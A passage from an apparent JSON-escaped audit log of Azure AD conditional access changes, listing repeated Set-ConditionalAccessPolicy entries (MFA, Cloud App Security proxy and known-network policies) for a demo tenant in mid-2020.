PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/30/2020 2:16:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/30/2020 2:16:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/30/2020 5:13:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/30/2020 5:13:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:03 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/31/2020 4:58:18 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 4:58:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/1/2020 2:29:49 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/1/2020 2:29:49 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:08 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/2/2020 2:12:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/2/2020 2:12:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/2/2020 5:26:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/2/2020 5:27:00 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/3/2020 5:18:08 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/3/2020 5:18:07 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/4/2020 1:49:57 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 